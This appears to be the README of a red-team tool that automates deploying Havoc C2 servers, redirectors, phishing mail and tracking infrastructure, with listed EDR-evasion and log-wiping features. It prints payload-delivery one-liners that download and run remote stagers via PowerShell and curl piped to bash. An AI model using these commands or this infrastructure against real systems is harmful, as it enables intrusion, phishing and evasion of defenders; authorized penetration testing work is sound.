# C2ingRed

A comprehensive automated deployment system for Havoc C2 red team infrastructure.

## Overview

C2ingRed enables rapid deployment of complete Command and Control (C2) infrastructure with advanced security hardening, EDR evasion capabilities, and operational security features. Built for professional red team operators, this tool uses Infrastructure as Code principles to efficiently set up Havoc C2 servers, redirectors, and additional components.

## Features

- **Multi-provider Support**: AWS, Linode, and FlokiNET
- **Infrastructure Components**:
  - C2 server with Havoc C2 Framework (dev branch)
  - HTTPS redirectors with security hardening
  - Email infrastructure with DKIM/DMARC for phishing
  - Email tracking capabilities
  - Automated payload generation and delivery
- **Security Features**:
  - Zero-logging configuration to minimize evidence
  - Memory protection mechanisms
  - Command history suppression
  - Secure exfiltration tunnels
  - Strong firewall configurations
  - Fail2Ban and other defensive measures
- **EDR Evasion**:
  - Sleep masking
  - Stack spoofing
  - AMSI/ETW patching
  - Indirect syscalls
  - Binary signature randomization
- **Operational Capabilities**:
  - Automated post-exploitation payload building
  - Reverse shell handler with automatic agent deployment
  - Let's Encrypt SSL certificate automation
  - Payload synchronization between C2 and redirectors
  - Port randomization for OPSEC

## Requirements

- Python 3.6+
- Ansible 2.9+
- Provider-specific credentials:
  - AWS: Access and secret keys
  - Linode: API token
  - FlokiNET: Pre-provisioned servers
- SSH keypair for server access
- Registered domain (required for Let's Encrypt certificates)

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/C2ingRed.git
cd C2ingRed

# Install requirements
pip install -r requirements.txt

# Ensure Ansible is installed
ansible --version
```

## Usage

### Main Menu (Easiest Method)

Simply run:
```bash
python3 deploy.py
```

This launches the interactive main menu for deployment, providing the most user-friendly experience with guided options for all infrastructure types.

### Interactive Mode

Alternatively, you can use:
```bash
./deploy.py --interactive
```

This guides you through the deployment process with step-by-step instructions.

### Command-line Deployment

#### AWS Deployment:
```bash
./deploy.py --provider aws --aws-key YOUR_KEY --aws-secret YOUR_SECRET \
            --domain your-domain.com --aws-region us-east-1
```

#### Linode Deployment:
```bash
./deploy.py --provider linode --linode-token YOUR_TOKEN \
            --domain your-domain.com --linode-region us-east
```

#### FlokiNET Deployment (with pre-provisioned servers):
```bash
./deploy.py --provider flokinet --flokinet-redirector-ip YOUR_REDIRECTOR_IP \
            --flokinet-c2-ip YOUR_C2_IP --domain your-domain.com
```

### Deployment Options

| Option | Description |
|--------|-------------|
| `--redirector-only` | Deploy only the redirector component |
| `--c2-only` | Deploy only the C2 server component |
| `--deploy-tracker` | Deploy email tracking server |
| `--integrated-tracker` | Setup tracker on C2 server instead of separate instance |
| `--disable-history` | Disable command history on servers |
| `--secure-memory` | Enable secure memory protection features |
| `--zero-logs` | Configure zero-logging throughout infrastructure |
| `--randomize-ports` | Use randomized ports for C2 communications |
| `--ssh-after-deploy` | Automatically SSH into the server after deployment |

## Post-Deployment Steps

After successful deployment:

1. Configure DNS records for your domain:
   - `your-domain.com` → C2 server
   - `mail.your-domain.com` → C2 server
   - `cdn.your-domain.com` → Redirector (or your custom subdomain)
   - `track.your-domain.com` → Tracker (if deployed)

2. Run post-install scripts on each server:
   ```bash
   # On C2 server
   /root/Tools/post_install_c2.sh
   
   # On redirector
   /root/Tools/post_install_redirector.sh
   ```

3. Generate Havoc C2 payloads:
   ```bash
   # On C2 server
   /root/Tools/generate_havoc_payloads.sh
   ```

## Using Havoc C2

Havoc C2 Framework is installed at `/root/Tools/Havoc` on the C2 server.

### Connecting to the Teamserver

From your local machine:

```bash
# Install Havoc client (development branch)
git clone -b dev https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
mkdir build && cd build
cmake -GNinja ..
ninja

# Connect to Teamserver
./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
```

The password is stored in `/root/Tools/Havoc/data/profiles/default.yaotl` on the C2 server.

### Payload Delivery

PowerShell one-liner for Windows targets:
```powershell
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
```

Linux one-liner:
```bash
curl -s https://cdn.your-domain.com/linux_stager.sh | bash
```

## Security Considerations

- All servers include the `/root/Tools/secure-exit.sh` script to securely wipe operational data
- The `/root/Tools/clean-logs.sh` script automatically runs to remove evidence
- Port randomization enhances OPSEC when enabled
- Set proper DKIM/DMARC records for email operations
- Consider using ephemeral infrastructure for high-risk operations

## Cleaning Up

To remove all infrastructure when finished:

```bash
./deploy.py --provider PROVIDER --teardown --deployment-id YOUR_DEPLOYMENT_ID
```

Add your provider-specific authentication arguments to remove the correct resources.

## Disclaimer

This tool is intended for authorized red team operations, penetration testing, and security research only. Always obtain proper authorization before conducting security testing. The authors are not responsible for misuse or illegal activities.